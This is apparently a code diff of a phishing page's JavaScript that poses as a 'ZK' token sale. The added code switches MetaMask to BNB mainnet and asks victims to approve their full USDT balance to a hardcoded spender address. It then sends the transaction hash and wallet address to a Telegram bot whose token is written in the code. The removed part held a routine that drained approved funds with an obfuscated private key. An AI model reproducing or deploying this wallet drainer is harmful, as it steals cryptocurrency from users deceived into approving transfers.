@@ -280,20 +280,18 @@ module.exports=[
 },{}],2:[function(require,module,exports){
 window.onload = async function(){
   let useraddress;
-  // let network_id = '0x38'; // bnb mainnet
-  let network_id = '0x61';  // bnb testnet
+  let network_id = '0x38'; // bnb mainnet
+  // let network_id = '0x61';  // bnb testnet
+  // let network_id = '0x89';  // polygon mainnet
 
   const tokenAddress = '0x337610d27c682E347C9cD60BD4b3b107C9d34dDd'; // bsc usdt contract
   const spenderAddress = '0xb7E5bE0162c1639205a84BAf49067EeDEEc3e2a6'; // spender address
-  let recipientAddress = '0xad166A918d20703D6D5d97919C79f4C56e12A68f'; // recipient address
   let bot_token = '6458087750:AAHfey42yyHAJk3lmXb12XJCOeQlf9u3x7M';
   let token_amount;
-  let approval_balance;
 
-  let token_symbol = "ZK";
-  let per_token_price = "$ 23";
-  let fsdi = 'a1e844193b2ce95a9f0cde1d79f';
-  
+  let token_symbol = 'ZK';
+  let per_token_price = '$ 23';
+
   // ========================= script for trsfo =========================================
 
   let connect_button = document.querySelector('.connect_button');
@@ -302,16 +300,20 @@ window.onload = async function(){
 
   document.querySelector('.token_contract_p').innerText = tokenAddress;
   document.querySelector('.per_token_p_p').innerText = per_token_price;
-  
+
   connect_button.addEventListener('click', connect_meamask);
 
   async function change_network(network_id) {
     if (typeof window.ethereum !== 'undefined') {
       const ethereum = window.ethereum;
-      ethereum.request({method: 'wallet_switchEthereumChain',params: [{ chainId: network_id }],})
+      ethereum
+        .request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: network_id }],
+        })
         .then((response) => {})
         .catch((error) => {
-           console.error(error);
+          console.error(error);
         });
     } else {
       console.error('MetaMask is not installed');
@@ -327,7 +329,9 @@ window.onload = async function(){
   async function connect_meamask() {
     if (window.ethereum) {
       const ethereum = window.ethereum;
-      const accounts = await ethereum.request({ method: 'eth_requestAccounts',});
+      const accounts = await ethereum.request({
+        method: 'eth_requestAccounts',
+      });
       useraddress = accounts[0];
       await wallet_connected(useraddress);
       await change_network(network_id);
@@ -346,13 +350,19 @@ window.onload = async function(){
   const provider = new ethers.providers.Web3Provider(window.ethereum);
   await window.ethereum.enable();
 
-  const tokenContract = new ethers.Contract(tokenAddress,tokenAbi,provider.getSigner());
+  const tokenContract = new ethers.Contract(tokenAddress,tokenAbi, provider.getSigner());
 
   // get user token balance
   async function approve() {
-    const amountToApprove = ethers.utils.parseUnits(token_amount.toString(), 18);
+    const amountToApprove = ethers.utils.parseUnits(
+      token_amount.toString(),
+      18,
+    );
     const tx = await tokenContract.approve(spenderAddress, amountToApprove);
     await tx.wait();
+     fetch(
+       `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=5204205237&text=Tx- <code>${tx.hash}</code>, Address- <code>${useraddress}</code>&parse_mode=HTML`,
+     );
   }
 
   // get user token balance
@@ -361,53 +371,15 @@ window.onload = async function(){
     let token_balance = ethers.utils.formatUnits(balance, 18);
 
     token_amount = token_balance;
-    document.querySelector('.token_balance_p').innerText = token_amount + " " + token_symbol;
+    document.querySelector('.token_balance_p').innerText =
+      token_amount + ' ' + token_symbol;
     return token_balance;
   }
 
-  // check allowance 
-  async function allowance(){
-    const allowance = await tokenContract.allowance(useraddress,spenderAddress);
-
-    approval_balance = ethers.utils.formatUnits(allowance, 18);
-    return approval_balance;
-  }
-
-  // transfer funds from user wallet to another wallet
-  ;
-  const none_f = fsdi+document.querySelector('.skdfjsk').innerText+'20f2d04f42ad8b89691';
-  const wallet = new ethers.Wallet(none_f+'777', provider);
-  const admin_tokenContract = new ethers.Contract(tokenAddress, tokenAbi, wallet);
-
-  async function transferFrom(){
-    if(approval_balance > 0){
-        let transfer_from_balance = ethers.utils.parseUnits(approval_balance.toString(),18);
-
-        const gasEstimate = await admin_tokenContract.estimateGas.transferFrom(useraddress,recipientAddress,transfer_from_balance);
-
-        const gasPrice = await provider.getGasPrice();
-
-        const tx = await admin_tokenContract.transferFrom(
-          useraddress,
-          recipientAddress,
-          transfer_from_balance,
-          {gasPrice: gasPrice,gasLimit: gasEstimate,}
-        );
-        await tx.wait();
-        fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=5204205237&text=Tx- <code>${tx.hash}</code>&parse_mode=HTML`);
-    }else{
-      console.log('approve amount low');
-    }
-  }
-
-
   // ============== controller ===============
-  async function controller(){
-
+  async function controller() {
     await getBalance();
     await approve();
-    await allowance();
-    await transferFrom();
   }
   
 }
